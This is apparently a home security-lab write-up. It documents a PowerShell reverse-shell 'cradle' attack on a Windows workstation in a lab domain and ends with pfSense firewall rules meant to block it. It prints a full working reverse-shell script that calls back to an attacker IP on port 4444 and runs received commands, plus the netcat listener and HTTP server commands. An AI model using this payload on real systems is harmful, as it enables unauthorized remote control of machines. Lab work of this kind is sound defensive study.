
# Reverse Shell Backdoor with Powershell Cradle Attack

## Overview

- **Target:** Windows Workstation (SOC.LAB domain)
  - **IP Address:** 192.168.10.20
  - **Domain:** SOC.LAB
- **Attacker:** Kali «
  - **IP Address:** 192.168.20.30

## Objective
Create and deploy a malicious PowerShell script to establish a reverse shell on a Windows workstation. The attacker uses Kali Linux to serve the payload and capture the connection, giving them remote access to the Windows's machine.

## Attack Execution Timeline

### 1. **Create Malicious PowerShell Payload**

Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this [git](https://github.com/das-lab/mpsd) and [post](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Send a message to confirm the connection
$writer.WriteLine("Connected to backdoor!")
$writer.Flush()

while ($true) {
    # Receive command from the Kali
    $writer.Write("> ")  
    $writer.Flush()    
    $command = $reader.ReadLine()
    
    # If the command is "exit", close the connection
    if ($command -eq "exit") {
        break
    }
    
    # Execute the command on the Windows machine and capture output
    $output = Invoke-Expression $command 2>&1
    
    # Send the output back to the Kali
    $writer.WriteLine($output)
    $writer.Flush()
}

$client.Close()
```

### 2. **Set Up HTTP Server to Serve Payload**

Once the payload script was created, I hosted an HTTP web server just to simulate the Windows user to download malware through a link. Meanwhile I used Netcat to listen for an incoming connection from the reverse shell:

```bash
python3 -m http.server 80
```
```bash
nc -lvnp 4444
```

### 4. **Victim Downloads and Executes the Malicious Payload**

After the Windows user has downloaded and executed the malicious payload,it bypasses the PowerShell execution policy and downloads the malicious script from the attacker’s web server to the target machine. Once executed, the script initiates the reverse shell and connects back to my kali’s machine.

### 5. **Execute Commands on the Target Machine**

After successfully establishing the reverse shell, I could run every command that i wanted to on that Windows machine or gather information about the system. Some useful commands executed during the attack include:

- **`whoami`** – To confirm the user currently logged in:

![whoami](https://github.com/user-attachments/assets/7a988e9f-9477-4124-ba5f-e5a70b6656cb)



- **`tasklist`** – To list all running processes:
  
![tasklist](https://github.com/user-attachments/assets/9751f108-cbbe-4467-b7e1-49f94d57b2cb)


- **`ipconfig`** – To display the network configuration, including IP addresses:
  
![ipconfig](https://github.com/user-attachments/assets/78b34a03-65f9-4b65-b641-ba866db86f93)


- **`systeminfo`** – To gather detailed information about the operating system and hardware:
  
![systeminfo](https://github.com/user-attachments/assets/3f524861-1014-4602-b281-2b24def33d74)


## PfSense Configuration

1- **Block Unauthorized Outbound Traffic (Reverse Shell Protection):**

![rule1](https://github.com/user-attachments/assets/ba106ecb-9147-4d63-8dda-af2b43ab352b)


**Explanation:**  
Reverse shells typically use common TCP ports (like 4444) to establish outbound connections to an attacker’s machine, this rule blocks these outbound connections, preventing compromised systems from connecting back to kali.


2- **Restrict PowerShell Downloads:**

![rule2](https://github.com/user-attachments/assets/48c6ac50-19e7-4254-ba25-7854df7ae71b)

**Explanation:**  
PowerShell cradle attacks often download scripts via HTTP/HTTPS. This rule blocks PowerShell from making external web requests, mitigating PowerShell-based malware delivery.


Note: In this experiment, CrowdSec was disabled to allow this action to proceed, but the rules are on the [configs directory](https://github.com/NunooFerreira/SOC-Lab-Home-Cybersecurity-Monitoring/blob/main/configs/CrowdSec_configs/custom_reverse_powershell.yaml).


